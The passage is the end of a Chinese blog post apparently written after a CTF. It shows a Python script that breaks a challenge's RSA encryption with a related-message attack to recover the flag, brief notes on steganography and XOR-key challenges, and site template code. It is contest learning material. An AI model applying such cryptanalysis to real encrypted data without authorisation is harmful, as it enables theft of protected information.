class="line"></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getM2</span><span class="params">(a, b, c1, c2, n)</span>:</span></span><br><span class="line">    a3 = pow(a, <span class="number">3</span>, n)</span><br><span class="line">    b3 = pow(b, <span class="number">3</span>, n)</span><br><span class="line">    first = c1 - a3 * c2 + <span class="number">2</span> * b3</span><br><span class="line">    first = first % n</span><br><span class="line">    second = <span class="number">3</span> * b * (a3 * c2 - b3)</span><br><span class="line">    second = second % n</span><br><span class="line">    third = second * gmpy2.invert(first, n)</span><br><span class="line">    third = third % n</span><br><span class="line">    fourth = (third + b) * gmpy2.invert(a, n)</span><br><span class="line">    <span class="keyword">return</span> fourth % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    a=<span class="number">1</span></span><br><span class="line">    p1 = <span class="number">0x3</span></span><br><span class="line">    p2 = <span class="number">0x2</span></span><br><span class="line">    b = p1-p2</span><br><span class="line">    c1 = getN(p1)</span><br><span class="line">    c1 = int(c1)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Get c1 : '</span>+c1</span><br><span class="line">    <span class="comment">#c1 = 4040550759126551313127879899636800199760099979602512807721308942907341737372598965845061817542066386883548650528800590184849063222814847616775093607912296776910611548623501134418499550685986364310156248071710717427911721096233804780913991647648409404834200136039096999383400370351692959803296340688274014229061486701541017669916343662269501035558219473125790553466479555340351901731110386492582944347499684521762399368687477599439507273815685741371102490453348532687431146493700511093914130913635339612030284757726814264429341664874736946689161838596269677967341025300319138663224411496212206172710550171404584696376</span></span><br><span class="line">    c2 = getN(p2)</span><br><span class="line">    c2 = int(c2)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Get c1 : '</span> + c2</span><br><span class="line">    <span class="comment">#c2 = 4040550759126551313127879899636800199760099979602512807721308942907341737372598965845061817542066386883548650528800590184849063222814847616775093607912296776910611548620713793393742131697597021000121588789548380208470833871131571472102397693877351084300317267524596274165059291707918830306856672426596908657961298632954906754012002586982075550049230547736251417594462552852161838401584200909021493166001060220102251258554222090944046085140724432388604586777229389265554023896883837281355657435827125066245856919913434692236750355846491785345707967523143293119108175714446663836930511150337474289868356329463188216785</span></span><br><span class="line">    n = <span class="number">15140693307781575272905350127561480454925382248795401006625344434130151846159152971573000556723863453355181533147841646458143380103726586571049885350673144089829068009655419999239385581818120152814330978257677531674973337312840399216471492585834737174518293085143844527211526737653844651552314020009101138118532093970566042720563471752966826492765420192021844395106141004313477990385827147980290701501857295050930728740995972148940052482089846995233018778559881494686891833098312466976990249602655019736515270250381315543985877162881197770970391243217647571088328005066371951384078096064640638774932935204127654713461L</span></span><br><span class="line">    m = getM2(a, b, c1, c2, n) - p2</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Get flag : '</span>+libnum.n2s(m)</span><br></pre></td></tr></table></figure></p>
+<h1 id="其余题目的赛后思路记录"><a href="#其余题目的赛后思路记录" class="headerlink" title="其余题目的赛后思路记录"></a>其余题目的赛后思路记录</h1><hr>
+<h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="Weird-CSP"><a href="#Weird-CSP" class="headerlink" title="Weird CSP"></a>Weird CSP</h3><h3 id="Ozone！"><a href="#Ozone！" class="headerlink" title="Ozone！"></a>Ozone！</h3><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="DARLING-in-the-FRANXX"><a href="#DARLING-in-the-FRANXX" class="headerlink" title="DARLING in the FRANXX"></a>DARLING in the FRANXX</h3><p>题目给了一个mkv，估计涉及到隐写，使用mkv 分析工具mkvtoolnix查看文件，得到视频、音频、字幕，可以尝试分别对它们进行提取后分析</p>
+<p>这里的flag藏在字幕中，使用mkvextract提取字幕</p>
+<blockquote>
+<p>mkvextract tracks file.mkv 2:out</p>
+</blockquote>
+<h3 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h3><h3 id="Xbox"><a href="#Xbox" class="headerlink" title="Xbox"></a>Xbox</h3><h3 id="q2coding"><a href="#q2coding" class="headerlink" title="q2coding"></a>q2coding</h3><h2 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="xor-letter"><a href="#xor-letter" class="headerlink" title="xor_letter"></a>xor_letter</h3><p>给了一个xor后的字符串密文，需要得到key，根据题目letter，信件开头(Hi….)和结尾(Yours….)结合密文得到key，解密密文得到flag</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><hr>
+<p>今年的题目整体来说比去年难一些</p>
+<p>自己比去年进步一些，题目基本上都是独立完成的，继续努力吧</p>
+<p>多做题，更加熟练一些</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/04/study/mac+phpstorm+xdebug调试thinkphp5漏洞/" rel="next" title="mac+phpstorm+xdebug调试thinkphp">
+                <i class="fa fa-chevron-left"></i> mac+phpstorm+xdebug调试thinkphp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">White2Bai</p>
+              <p class="site-description motion-element" itemprop="description">世事秋凉，道阻且长。<br/>愿你我都能去危就安，得偿所望。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:skyxxb676@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Easy-Injection"><span class="nav-number">1.1.</span> <span class="nav-text">Easy Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#python模板注入"><span class="nav-number">1.1.1.</span> <span class="nav-text">python模板注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#config-SECRET-KEY-cookie"><span class="nav-number">1.1.2.</span> <span class="nav-text">config[SECRET_KEY]+cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unicode-大小写-绕过"><span class="nav-number">1.1.3.</span> <span class="nav-text">unicode 大小写 绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag"><span class="nav-number">1.1.4.</span> <span class="nav-text">Flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Object"><span class="nav-number">1.2.</span> <span class="nav-text">Object?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#反序列化绕过"><span class="nav-number">1.2.1.</span> <span class="nav-text">反序列化绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">Flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注意"><span class="nav-number">1.2.3.</span> <span class="nav-text">注意</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JustUpload"><span class="nav-number">1.3.</span> <span class="nav-text">JustUpload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#后缀绕过"><span class="nav-number">1.3.1.</span> <span class="nav-text">后缀绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件类型绕过"><span class="nav-number">1.3.2.</span> <span class="nav-text">文件类型绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内容绕过"><span class="nav-number">1.3.3.</span> <span class="nav-text">内容绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注意-1"><span class="nav-number">1.3.4.</span> <span class="nav-text">注意</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Re"><span class="nav-number">2.</span> <span class="nav-text">Re</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#APK-Open-Sesame"><span class="nav-number">2.1.</span> <span class="nav-text">[APK]Open Sesame!</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#jnihelloword"><span class="nav-number">2.1.1.</span> <span class="nav-text">jnihelloword</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rsaEncode"><span class="nav-number">2.1.2.</span> <span class="nav-text">rsaEncode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#动态调试"><span class="nav-number">2.1.3.</span> <span class="nav-text">动态调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag-2"><span class="nav-number">2.1.4.</span> <span class="nav-text">Flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注意-2"><span class="nav-number">2.1.5.</span> <span class="nav-text">注意</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">3.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Hello-World"><span class="nav-number">3.1.</span> <span class="nav-text">Hello_World</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">4.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-rsa"><span class="nav-number">4.1.</span> <span class="nav-text">ez_rsa</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sha256"><span class="nav-number">4.1.1.</span> <span class="nav-text">sha256</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rsa-padding-attack"><span class="nav-number">4.1.2.</span> <span class="nav-text">rsa padding attack</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#其余题目的赛后思路记录"><span class="nav-number">5.</span> <span class="nav-text">其余题目的赛后思路记录</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-1"><span class="nav-number">5.1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Weird-CSP"><span class="nav-number">5.1.1.</span> <span class="nav-text">Weird CSP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ozone！"><span class="nav-number">5.1.2.</span> <span class="nav-text">Ozone！</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">5.2.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DARLING-in-the-FRANXX"><span class="nav-number">5.2.1.</span> <span class="nav-text">DARLING in the FRANXX</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GIF"><span class="nav-number">5.2.2.</span> <span class="nav-text">GIF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Xbox"><span class="nav-number">5.2.3.</span> <span class="nav-text">Xbox</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#q2coding"><span class="nav-number">5.2.4.</span> <span class="nav-text">q2coding</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto-1"><span class="nav-number">5.3.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xor-letter"><span class="nav-number">5.3.1.</span> <span class="nav-text">xor_letter</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">White2Bai</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("lz4EcuQKwEBpgvTJ0c96EBeT-gzGzoHsz", "zNO9SnbXBuok32HxFQz37Fff");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
